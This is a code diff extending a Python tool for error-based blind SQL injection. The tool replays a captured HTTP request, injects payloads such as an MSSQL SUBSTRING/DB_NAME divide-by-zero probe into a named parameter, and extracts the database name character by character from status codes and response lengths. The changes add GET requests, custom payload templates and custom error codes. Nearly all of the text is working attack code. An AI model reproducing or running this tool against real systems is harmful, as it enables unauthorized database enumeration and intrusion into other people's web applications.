@@ -9,12 +9,18 @@ LETTERS = string.ascii_lowercase + ''.join(map(str, range(10))) + '_'
 
 def arg_parser():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-f', '--file', type=str, required=True, help='URL.')
+    parser.add_argument('-r', '--request', type=str, required=True, help='URL.')
     parser.add_argument('-p', '--param', type=str, required=True, help='Vulnrable Parameter.')
     parser.add_argument('--dbms', type=str, default='MSSQL', help='SQL System.')
     parser.add_argument('--prefix', type=str, default='', help='Prefix to use in the payload.')
+    parser.add_argument('--code', type=int, default=500, help='Status code to identify error.')
+    parser.add_argument('--payload', type=str, default='', help='Payload to use.')
     args = parser.parse_args()
     return args
+
+def sub_placeholders(payload: str, index: int, char: str) -> str:
+    return payload.replace("X", str(index)).replace("Y", char)
+
 def get_payload(key: str, index: int, char: str) -> str:
     payloads = {
         "MSSQL": r" AND (CASE WHEN SUBSTRING(DB_NAME(),X,1)='Y' THEN 1/0 ELSE 0 END=1)--",
@@ -29,11 +35,11 @@ def get_payload(key: str, index: int, char: str) -> str:
     if not payload: print_exit("Database não encontrado")
     return payload.replace("X", str(index)).replace("Y", char)
 
-def print_exit(str):
+def print_exit(str: str) -> str:
     print(str)
     sys.exit(1)
 
-def get_file(file):
+def get_file(file) -> list:
     with open(file, 'r', encoding='utf-8') as f:
         return f.readlines()
     
@@ -46,12 +52,10 @@ def parse_file(file, param: str) -> dict:
         "Host": None,
         "Cookie": None,
         "Path": None,
-        "body": None,
+        "Body": None,
     }
 
-    if file[-2].strip(): print_exit("Error: Body is null")
-    data["body"] = file[-1].strip()
-
+    
     for line in file:
         if not data["Method"]:
             data["Method"] = line.split()[0]
@@ -62,8 +66,14 @@ def parse_file(file, param: str) -> dict:
         if line.lower().startswith("cookie:"):
             data["Cookie"] = line.split(":", 1)[1].strip()
 
-    if data["Method"] != 'POST': print_exit("Error: Method not supported")
-    if not f'{param}=' in data["body"]: print_exit(f"Error: Parameter '{param}' not found in body.")
+    if data["Method"] == "GET":
+        data["Body"] = data["Path"].split('?')[1]
+
+    elif file[-2].strip(): 
+        print_exit("Error: Body is null")
+    else:
+        data["Body"] = file[-1].strip()
+        if not f'{param}=' in data["Body"]: print_exit(f"Error: Parameter '{param}' not found in Body.")
     return data
 
 def validate_ssl(file) -> str:
@@ -73,24 +83,24 @@ def validate_ssl(file) -> str:
             if origin.startswith('https'):
                 return 'https'
             return 'http'
-
+        else:
+            return 'http'
+        
 def make_original_request(data: dict, ssl: str) -> int:
     url = f'{ssl}://{data["Host"]}{data["Path"]}'
-
     headers = {
         "Cookie": data["Cookie"],
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": user_agent,
     }
     
-    body = parse_form_data(data["body"])
-    res = requests.post(url, headers=headers, data=body)
-
+    Body = parse_form_data(data["Body"])
+    res = requests.post(url, headers=headers, data=Body)
     if res.status_code != 200:
         print_exit(f"Error: Request failed. Status code: {res.status_code}")
     return len(res.content)
 
-def make_malicious_request(data: dict, ssl: str, sql_key: str, res_original_length: int, prefix) -> None:
+def make_malicious_request(data: dict, ssl: str, sql_key: str, res_original_length: int, prefix: str, custom_code: int, custom_payload: str) -> str:
     url = f'{ssl}://{data["Host"]}{data["Path"]}'
     headers = {
         "Cookie": data["Cookie"],
@@ -98,30 +108,36 @@ def make_malicious_request(data: dict, ssl: str, sql_key: str, res_original_leng
         "User-Agent": user_agent,
     }
     
-    body = parse_form_data(data["body"])
+    Body = parse_form_data(data["Body"])
 
     dbname = []
-    for index in range(1, 11):
+    for index in range(1, 64):
         for char in LETTERS:
-            payload = get_payload(sql_key, index, char)
-            body[f'{args.param}'] = prefix + payload if prefix else payload
-            res = requests.post(url, headers=headers, data=body)
-            if res.status_code == 500 and len(res.content) != res_original_length:
+            payload = sub_placeholders(custom_payload, index, char) if custom_payload else get_payload(sql_key, index, char)
+            Body[f'{args.param}'] = prefix + payload if prefix else payload
+            res = requests.post(url, headers=headers, data=Body) if data["Method"] == "POST" else requests.get(f"{url}{Body[f'{args.param}']}", headers=headers)
+
+            comparator = "==" if custom_code else "!="
+            if eval(f'res.status_code == custom_code and len(res.content) {comparator} res_original_length'):
                 dbname.append(char)
                 print(f"Letter {char} found in index {index}")
                 break
             if char == LETTERS[-1] and len(dbname):
-                print(f"Database Name:",''.join(dbname))
+                print_exit(f"Database Name: {''.join(dbname)}")
             elif char == LETTERS[-1]:
                 print_exit('Error, no letters were found')
+
 def main(args):
-    if not os.path.isfile(args.file):
-        print_exit(f"Error: File '{args.file}' not found.")
-    file_content = get_file(args.file)
+    if not os.path.isfile(args.request):
+        print_exit(f"Error: File '{args.request}' not found.")
+    elif args.payload:
+        if 'X' not in args.payload or 'Y' not in args.payload:
+            print_exit('Error: Invalid payload. Use X and Y placeholders. X to Index, Y to letter')
+    file_content = get_file(args.request)
     data = parse_file(file_content, args.param)
-    ssl =validate_ssl(file_content)
+    ssl = validate_ssl(file_content)
     res_length = make_original_request(data, ssl)
-    make_malicious_request(data, ssl, args.dbms, res_length, args.prefix)
+    make_malicious_request(data, ssl, args.dbms, res_length, args.prefix, args.code, args.payload)
 
 if __name__ == "__main__":
     args = arg_parser()
